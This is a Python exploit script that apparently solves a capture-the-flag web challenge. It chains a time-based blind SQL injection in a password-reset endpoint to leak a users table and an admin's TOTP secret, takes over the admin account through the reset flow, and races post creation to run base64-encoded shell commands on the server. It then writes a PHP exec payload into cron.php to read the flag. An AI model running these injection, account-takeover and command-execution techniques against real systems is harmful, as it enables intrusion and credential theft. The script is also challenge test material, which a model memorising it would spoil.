#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
import re
import os
import requests
import time
import string
import math
import pyotp 
import base64
from threading import Thread
from pwn import *

# Find flag by exact match
# log.success(find_flag(io.recvall()))
real_flag = open("/flag.txt", "r").readline().strip()
fake_flag = open("/flag-fake.txt", "r").readline().strip()
def find_flag(output):
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    # Match real flag
    if real_flag in output:
        return real_flag
    # Match fake flag
    if fake_flag in output:
        return fake_flag
    # Match regexp flag
    r = find_flag_fmt(output)
    if r is not None:
        return r
    # Definitely no flag found
    return None

# Find flag by format
# log.success(find_flag_fmt(io.recvall()))
ffmt = re.compile(r"gctf{.*}")
def find_flag_fmt(output):
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    m = ffmt.search(output)
    if m is None:
        return None
    return m.group(0)


protocol = os.environ.get("PROTOCOL", "http")
domain = os.environ.get("DOMAIN", "http")
host = os.environ.get("HOST", "localhost")

port = int(os.environ.get("PORT", "1337"))

def get_subdomain_from_instance():
    print(f"[+] If you run distrun this might take a bit")
    io = connect(host, port)
    io.sendlineafter(b"start a new instance\n", b"", timeout=5)
    data = io.recvuntil(b"Wait some time", timeout=5).decode().strip()
    res_ins = re.search("\[\+\] http.*\/\/([a-zA-Z:\/\.\d]*)", data)
    res = re.search("\[\+\] (http[a-zA-Z:\/\.\d]*)", data)
    return res[1].strip(), res_ins[1].strip()
def get_subdomain_from_instance():
    io = connect(host, port)
    io.sendlineafter(b"start a new instance\n", b"", timeout=15)
    data = io.recvuntil(b"Wait some time").decode().strip()
    res_ins = re.search("\[\+\] http.*\/\/([a-zA-Z:\/\.\d]*)", data)
    res = re.search("\[\+\] (http[a-zA-Z:\/\.\d]*)", data)
    return res[1].strip(), res_ins[1].strip()

try:
    url, instance_url = get_subdomain_from_instance()
    print(f"[+] Created new instance: {instance_url}")
    print("[+] Waiting 5 seconds until instance is up")
    time.sleep(5)
except:
    subdomain = "" 
    url = f"{protocol}://{host}:{port}"
    instance_url = f"{host}:{port}"
    print(f"[+] URL: {url}")

print("[+] Running exploit")

def log(message):
    print("[+] " + message, flush=True)

DELAY=0.15 # This value needs to be empirically determined

base_domain = url
if base_domain.endswith(".localhost:8080"):
    base_domain = "http://127.0.0.1:8080"
print(f"[+] Base domain {base_domain}")

keys = string.ascii_letters + string.digits + string.punctuation + string.whitespace

def tryValue(valueToTry, field, table, subquery = ""):
    attack = f"SELECT MAX(CASE WHEN {field} like '{valueToTry}%' AND substr({field}, 1, {len(valueToTry)}) = '{valueToTry}' THEN 12 ELSE 5 END) FROM {table} {subquery}"
    username = f"' OR 1 UNION {attack}; --"

    res = requests.post(base_domain + "/reset.php", data={
        "form_name": "reset",
        "username": "admin",
        "is_tenant": "1"
    }, headers={"Host": instance_url})
    matches = re.findall("Reset code (.*) uses", res.text)
    if len(matches) != 1:
        log("Could not retrieve reset code")
        # return False

    reset_code = matches[0]

    start = time.time()
    res = requests.post(base_domain + "/set_new_password.php", data={
        "form_name": "set_new_password",
        "username": username,
        "code": reset_code,
        "password": "somepw",
        "password_confirm": "somepw"
    }, headers={"Host": instance_url})
    end = time.time()
    diff = end - start
    # print(valueToTry + ": " + str(diff))
    return diff > DELAY

def getValue(field, table, req_length=1000, init_val=[""], subquery="", custom_keys = None):
    final_values = []
    values = init_val
    found_values = [""]
    ukeys = keys if custom_keys == None else custom_keys 
    print("[+] " + values[0], end="", flush=True)
    while len(found_values) > 0:
        found_values = []
        for key in ukeys:
            for found_value in values:
                if tryValue(found_value + key, field, table, subquery):
                    if len(found_value) <= req_length:
                        print(str(key), end="", flush=True)
                        found_values.append(found_value + key)
        for value in values:
            was_found = False
            for found_value in found_values:
                if value in found_value:
                    was_found = True
            if not was_found:
                final_values.append(value) # Then we have found our value

        values = found_values
    print("", flush=True)
    return final_values

def loginAsUser(username, totp):
    sess = requests.Session()
    sess.headers = {"Host": instance_url}
    res = sess.post(base_domain + "/reset.php", data={
        "form_name": "reset",
        "username": username,
        "is_tenant": "1"
    })
    matches = re.findall("Reset code (.*) uses", res.text)
    if len(matches) != 1:
        log("Could not retrieve reset code")
        return False

    reset_code = matches[0]
    new_password = "lospw"

    res = sess.post(base_domain + "/set_new_password.php", data={
        "form_name": "set_new_password",
        "username": username,
        "code": reset_code,
        "password": new_password,
        "password_confirm": new_password
    })

    res = sess.post(base_domain + "/login.php", data={
        "form_name": "login",
        "username": username,
        "password": new_password
    })

    res = sess.post(base_domain + "/totp.php", data={
        "form_name": "totp",
        "totp": totp,
    })
    if "logout" in res.text:
        return sess
    return False


def leakUsersTable():
    tables = getValue("name", "sqlite_schema", len("_users") + len("tenant_") + 8, ["tenant_"])
    users_table = tables[0] if len(tables) == 1 else None

    if not users_table:
        log("Users table could not be leaked")
        exit(0)
    return users_table

def fullLogin(users_table, target_user):
    TOTP_SECRET_LENGTH = 8
    log("Leak TOTP of " + target_user + ", this might take a while")
    tokens = getValue("totp_secret", users_table, TOTP_SECRET_LENGTH, [""], "WHERE username = '"+target_user+"'", string.ascii_uppercase + string.digits)
    totp_tokens = []
    for token in tokens:
        if len(token) >= TOTP_SECRET_LENGTH:
            totp_tokens.append(token[:TOTP_SECRET_LENGTH])

    log("Possible tokens: " + ",".join(totp_tokens))

    for totp_token in totp_tokens:
        totp = pyotp.TOTP(totp_token)
        try:
            log("Trying: " + totp.now())
            session = loginAsUser(target_user, totp.now())
            if session != False:
                log("Found admin session")
                return session 
        except:
            log("Error retrieving the TOTP token")
    return False

####
# LEAK USER CREDENTIALS 
####
log("Leak table, this might take a while")
users_table = leakUsersTable()
log("Leaked Users Table: " + users_table)
sess = fullLogin(users_table, "admin")

if not sess:
    log("Session invalid")
    exit(1)

def addMediaPost(sess):
    res = sess.post(base_domain + "/", data={
        "form_name": "createPost",
        "content_type": "media",
        "message": "Heyho, please accept my request",
        "media_uri": "https://www.naturephotographie.com/wp-content/uploads/2018/07/The-Song-of-the-World.jpg",
        "password_protection": "whatever",
        "content": ""
    })
    # log("MEDIA" + str(res.status_code))

def addContentPost(sess, command):
    res = sess.post(base_domain + "/", data={
        "form_name": "createPost",
        "content_type": "text",
        "content": command,
        "media_uri": "",
        "message": "",
        "password_protection": "",
    })
    # log(str(res.status_code))


def addContentPosts(sess, command, amount):
    for _ in range(amount):
        addContentPost(sess, command)

def runCommand(raw_command):
    # Our text is htmlspeciachar encoded. We need to consider that!
    # We encode it to base64, decode it on the server and run it in sh
    # Otherwise, we could not use special chars like "
    encoded = base64.b64encode(raw_command.encode()).decode()
    command = f"echo {encoded} | base64 -d | /bin/sh"
    THREADS=1
    CONTENT_REQUESTS=10
    MEDIA_REQUESTS=1

    addMediaPost(sess)

    cps = []
    for i in range(THREADS):
        cps.append(Thread(target=addContentPosts, args=(sess,command,CONTENT_REQUESTS)))

    for c in cps:
        c.start()

    for i in range(MEDIA_REQUESTS):
        addMediaPost(sess)

    for c in cps:
        c.join()

    res = sess.get(base_domain + "/")
    matches = re.findall("name=\"id\" value=\"(.*)\"", res.text)
    last_post_id = max([int(match) for match in matches])
    exploit_post_id = last_post_id+1

    res = sess.post(base_domain + "/", data={
        "form_name": "approve_content",
        "id": exploit_post_id
    })

    matches = re.findall("src=\"data:image;base64,(.*?)\"", res.text);
    if not matches or len(matches) == 0:
        log("COULD NOT FIND POST")
        exit(1)

    found = matches[-1]
    res = base64.b64decode(found).decode()
    return res

log("Modify /var/www/cron.php to make /flag.txt readable")
runCommand("echo \"<?php exec('chmod 644 /flag.txt'); ?>\" > /var/www/cron.php")
timeout = 40
wait_seconds = 5
log("Waiting for flag ...")
for i in range(math.ceil(timeout/wait_seconds)):
    res = runCommand("cat /flag.txt")
    flag = find_flag(res)
    if flag:
        log("Flag found: " + flag)
        exit(0)
    log("Flag not readable yet ...")
    time.sleep(wait_seconds)
exit(1)

